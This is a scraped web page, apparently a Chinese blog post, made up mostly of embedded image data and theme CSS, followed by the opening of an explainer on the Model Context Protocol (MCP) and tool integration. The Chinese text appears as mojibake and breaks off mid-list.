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) no-repeat 50%;background-size:64px 64px;opacity:.84}.markdown-body h1:after{position:absolute;content:"";width:150%;left:-25%;height:50%;bottom:12px;border-radius:50%;background:linear-gradient(transparent 80%,rgba(77,208,225,.8));background-size:400% 200%;opacity:.6;animation:h1Animate 6s linear infinite}@keyframes h1Animate{0%{background-position:100% 100%}50%{background-position:100% 50%}to{background-position:100% 100%}}.markdown-body h2{display:block;border-bottom:4px solid #4dd0e1;position:relative;font-size:24px;padding:12px 32px;margin:30px 0}.markdown-body h2:before{width:24px;height:24px;left:0;top:0;margin:auto;background-size:24px 24px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAADGklEQVRYR81X32vTYBQ999s6mFjQgQ+DrbHiVFZYU4cDcQ/6pGhTFVYFEXGi82H+Bz448UnEF1Fx9ccEEcXpZE3d5tP2ooKiTacTHaLNpigMHDgnU9tcSbrWrkwWR0sbyEOSe885ObnfvV8IRT6oyPwoLQHBx+OVM5WJvSyEVAhnBOjt7yU/+/rr6r6l8TMO+F/EN0JQhICqQpD/xaRpcpAc9tS+M+9lBCia/oqBamK+zeDuQogQZaKJk3wcQjxSva7tGQGB2Ke1zIk3DNyMyNL+QpCnMQOaPsDAVuGAp9cjvbYc8Ec/bCYSg0zoiHilk1tHxqsqEsYlML4kjIpT/eurJxRNPweQU5VdrWaOEo1fgKAVbBgXIz73kF3R/ph+ghgdzMYWM29eAWlBJqgZaFlFYtC6nhWpaDqnSGlIlV1WjJ3DloDNgyNLncudqgX//Ucg3LxuStHGuhi8pqKCW3rqV342rwFjRznKm+/LNaN2yC237ThgF2wxcfMLeP6+ncrKzoPoKTGeLQbYbg4TNoC5iZPJY5HGVRdSNZAWYBclD3FzBQzrR8hACAKdzBzKA/4/IYioDQaOskBbpEG6PO8qKKSAEi3CnEb0Pw4oMf0OmKbTDWqh3Lw6EIiNBZi5lxh3wz4puBD5ovqAMvxhHSdFKxE1CQe3m/07TeTX4lcJdAhE+1Sv65Z5P/ByvIGTRowIZ9igbtXnmrOsbTvgj+kHBNMuBu9OdVw8EeU4nC1A0cYmAHZOTRrLhra4Z8ywnSN6vZHAFTA2WnnMfQB3qz73ddsOZM8CACFDIPSgQXqebXEgqgeZcAeEe6pXasm1f8ew3igMtAHWac0Uc/jYdyAaP0xEBwFsmgUPqbJ0NE2UKj4EGcahiOzuyhagaHpnmtgcVgTcCMuua7YdyAHbA3ArQNscVFbb4635aD6fnYaTvxxi9UNP7ddMXaRWVBdAcaLk6bDXPZCNZ9uBXEsDUX1T2Cc9yjig6Z0EHg3LK8/aqf6MwJKchkXfks1+0+JtSq3qLPa23BRR1B+T/6nkfMaW1r9hPt/MLtYfTLEpP+T9FNoAAAAASUVORK5CYII=)}.markdown-body h2:after,.markdown-body h2:before{content:"";display:block;position:absolute;bottom:0}.markdown-body h2:after{right:0;width:400px;height:10px;border-top-right-radius:24px;background:linear-gradient(90deg,#fff,#4dd0e1);max-width:50vw}.markdown-body h3{margin:30px 0;font-size:18px;position:relative;padding:4px 32px;width:max-content}.markdown-body h3:before{border-bottom:2px solid #4dd0e1;width:100%;content:"";display:block;height:28px;position:absolute;left:0;top:0;bottom:-2px;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);background-repeat:no-repeat;animation:h3AnimationBefore 2s infinite alternate}@keyframes h3AnimationBefore{0%{width:28px}25%{width:100%}50%{width:100%}to{width:100%}}.markdown-body h3:after{content:"";display:block;width:28px;height:28px;position:absolute;border:2px solid #4dd0e1;border-radius:50%;right:-15px;top:0;bottom:0;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);animation:h3AnimationAfter 2s infinite alternate}@keyframes h3AnimationAfter{0%{transform:rotate(0)}10%{transform:rotate(0)}50%{transform:rotate(-1turn)}to{transform:rotate(-1turn)}}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin:22px 0;letter-spacing:2px;font-size:14px;word-spacing:2px}.markdown-body img{max-width:80%;border-radius:6px;display:block;margin:20px auto!important;object-fit:contain;box-shadow:0 0 16px hsla(0,0%,43.1%,.45)}.markdown-body figcaption{display:block;font-size:13px;color:#2b2b2b}.markdown-body figcaption:before{content:"";background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgBAMAAACBVGfHAAAAGFBMVEVHcExAuPtAuPpAuPtAuPpAuPtAvPxAuPokzOX5AAAAB3RSTlMAkDLqNegkoiUM7wAAAGBJREFUKM9jYBhcgMkBTUDVBE1BeDGqEtXychNUBeXlKEqACsrLQxB8lnCQQClCiWt5OYoSiAIkJVAF5eVBqAqAShTAAs7l5ShKWMwRAmAlSArASpAVgJUkCqIAscESHwCVVjMBK9JnbQAAAABJRU5ErkJggg==);display:inline-block;width:18px;height:18px;background-size:18px;background-repeat:no-repeat;background-position:50%;margin-right:5px;margin-bottom:-5px}.markdown-body hr{border:none;border-top:1px solid #4dd0e1;margin-top:32px;margin-bottom:32px}.markdown-body del{color:#4dd0e1}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:rgba(77,208,225,.08);color:#26c6da;padding:.195em .4em}.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace;overflow:auto;position:relative;line-height:1.75;box-shadow:0 0 8px hsla(0,0%,43.1%,.45);border-radius:4px;margin:16px}.markdown-body pre:before{content:"";display:block;height:30px;width:100%;margin-bottom:-7px;background:url(data:image/png;base64,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) 10px 10px no-repeat;background-size:40px}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{color:#4dd0e1;border-bottom:1px solid #4dd0e1;font-weight:400;text-decoration:none;margin:0 4px}.markdown-body a:active,.markdown-body a:hover{background-color:rgba(77,208,225,.1)}.markdown-body strong{color:#26c6da}.markdown-body strong:before{content:"ã€Œ"}.markdown-body strong:after{content:"ã€"}.markdown-body em{font-style:normal;color:#4dd0e1;font-weight:700}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(77,208,225,.05)}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{margin:2em 0;padding:24px 32px;border-left:4px solid #26c6da;background:rgba(77,208,225,.15);position:relative}.markdown-body blockquote:before{content:"â";top:8px;left:8px;color:#4dd0e1;font-size:30px;line-height:1;font-weight:700;position:absolute;opacity:.7}.markdown-body blockquote:after{content:"â";font-size:30px;position:absolute;right:8px;bottom:0;color:#4dd0e1;opacity:.7}.markdown-body blockquote p{color:#595959;line-height:2}.markdown-body ol,.markdown-body ul{color:#595959;padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>2024 å¹´æœ«ï¼ŒMCPï¼ˆModel Context Protocolï¼‰ç«äº†ã€‚å„ç§æŠ€æœ¯æ–‡ç« èœ‚æ‹¥è€Œè‡³ï¼š"MCP é©å‘½æ€§çªç ´ï¼"ã€"AI å·¥å…·è°ƒç”¨çš„æœªæ¥ï¼"ã€"ä¸æ‡‚ MCP å°±outäº†ï¼"</p>
<p>ä½†å½“ä½ çœŸæ­£å»äº†è§£æ—¶ï¼Œä¼šå‘ç°å¾ˆå¤šæ–‡ç« è¦ä¹ˆæ˜¯æ¦‚å¿µç§‘æ™®ï¼ˆè®²äº†åŠå¤©ä¸çŸ¥é“æ€ä¹ˆç”¨ï¼‰ï¼Œè¦ä¹ˆæ˜¯æ„¿æ™¯æç»˜ï¼ˆå¬èµ·æ¥å¾ˆç¾å¥½ä½†è½ä¸äº†åœ°ï¼‰ã€‚</p>
<p><strong>è¿™ç¯‡æ–‡ç« å°±æ˜¯æ¥ç ´å±€çš„ã€‚</strong> æˆ‘ä»¬ä¸è®²æ•…äº‹ï¼Œåªè®²æœ¬è´¨ï¼šMCP åˆ°åº•æ˜¯ä»€ä¹ˆï¼Ÿå®ƒè§£å†³äº†ä»€ä¹ˆé—®é¢˜ï¼Ÿå’Œ Function Call æœ‰ä»€ä¹ˆå…³ç³»ï¼Ÿè¯¥ä¸è¯¥ç”¨ï¼Ÿ</p>
</blockquote>
<hr/>
<h2 data-id="heading-0">ä¸€ã€MCP åˆ°åº•æ˜¯ä»€ä¹ˆï¼Ÿ</h2>
<h3 data-id="heading-1">1.1 ä¸€å¥è¯è¯´æ¸…æ¥š</h3>
<p><strong>MCPï¼ˆModel Context Protocolï¼Œæ¨¡å‹ä¸Šä¸‹æ–‡åè®®ï¼‰</strong> æ˜¯ä¸€å¥—æ ‡å‡†åŒ–çš„åè®®ï¼Œç”¨æ¥è§„èŒƒ AI åº”ç”¨å¦‚ä½•è°ƒç”¨å¤–éƒ¨å·¥å…·å’Œæ•°æ®æºã€‚</p>
<p>å¬èµ·æ¥è¿˜æ˜¯æœ‰ç‚¹æŠ½è±¡ï¼Ÿæˆ‘ä»¬æ¢ä¸ªè¯´æ³•ï¼š</p>
<p>æƒ³è±¡ä½ åœ¨å¼€å‘ä¸€ä¸ª AI åŠ©æ‰‹ï¼Œéœ€è¦æ¥å…¥ï¼š</p>
<ul>
<li>ğŸ“ <strong>åœ°å›¾æœåŠ¡</strong>ï¼šæŸ¥åœ°å€ã€è§„åˆ’è·¯çº¿</li>
<li>ğŸŒ¤ï¸ <strong>å¤©æ°”æŸ¥è¯¢</strong>ï¼šå®æ—¶å¤©æ°”ã€å¤©æ°”é¢„æŠ¥</li>
<li>ğŸ“Š <strong>æ•°æ®åº“</strong>ï¼šæŸ¥ç”¨æˆ·æ•°æ®ã€è®¢å•ä¿¡æ¯</li>
<li>ğŸ“§ <strong>é‚®ä»¶æœåŠ¡</strong>ï¼šå‘é€é€šçŸ¥</li>
</ul>
<p><strong>æ²¡æœ‰ MCP ä¹‹å‰</strong>ï¼šæ¯ä¸ªæœåŠ¡éƒ½æœ‰è‡ªå·±çš„æ¥å£æ ¼å¼</p>
<ul>
<li>A æœåŠ¡ç”¨ JSON-RPC</li>
<li>B æœåŠ¡ç”¨ REST API</li>
<li>C æœåŠ¡ç”¨ gRPC</li>
<li>D æœåŠ¡è¦è‡ªå®šä¹‰åè®®</li>
</ul>
<p>ä½ å¾—åˆ†åˆ«ç ”ç©¶æ¯ä¸ª API æ–‡æ¡£ï¼Œå†™ä¸åŒçš„é€‚é…ä»£ç ï¼Œç»´æŠ¤å¤šå¥—è°ƒç”¨é€»è¾‘ã€‚å›¢é˜Ÿåä½œæ—¶è¿˜è¦åå¤å¯¹é½æ¥å£æ ¼å¼ã€‚</p>
<p><strong>æœ‰äº† MCP ä¹‹å</strong>ï¼šå¤§å®¶çº¦å®šç»Ÿä¸€çš„"æ¥å£æ ‡å‡†"</p>
<ul>
<li>å·¥å…·æä¾›æ–¹æŒ‰ MCP åè®®æš´éœ²èƒ½åŠ›ï¼ˆMCP Serverï¼‰</li>
<li>AI åº”ç”¨æŒ‰ MCP åè®®è°ƒç”¨å·¥å…·ï¼ˆMCP Clientï¼‰</li>
